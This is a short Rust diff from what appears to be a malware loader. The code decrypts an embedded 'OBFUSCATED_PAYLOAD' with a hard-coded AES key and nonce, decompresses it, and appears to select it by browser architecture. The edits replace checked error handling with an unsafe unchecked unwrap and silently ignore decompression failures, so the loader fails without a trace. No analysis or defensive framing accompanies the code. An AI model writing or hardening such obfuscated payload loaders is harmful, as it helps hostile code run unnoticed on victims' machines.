@@ -21,7 +21,7 @@ fn browser_architecture(browser_name: &str) -> Architecture {
 #[inline(never)]
 fn decrypt_payload(enc: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
     use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};
-    let cipher = Aes256Gcm::new_from_slice(key).unwrap();
+    let cipher = unsafe { Aes256Gcm::new_from_slice(key).unwrap_unchecked() };
     let n = Nonce::from_slice(nonce);
     cipher.decrypt(n, enc).unwrap_or_default()
 }
@@ -31,7 +31,7 @@ fn get_payload(_arch: Architecture) -> Vec<u8> {
     let compressed = decrypt_payload(OBFUSCATED_PAYLOAD, AES_KEY, AES_NONCE);
     let mut decoder = DeflateDecoder::new(&compressed[..]);
     let mut decompressed = Vec::new();
-    decoder.read_to_end(&mut decompressed).expect("");
+    let _ = decoder.read_to_end(&mut decompressed);
     decompressed
 }
 
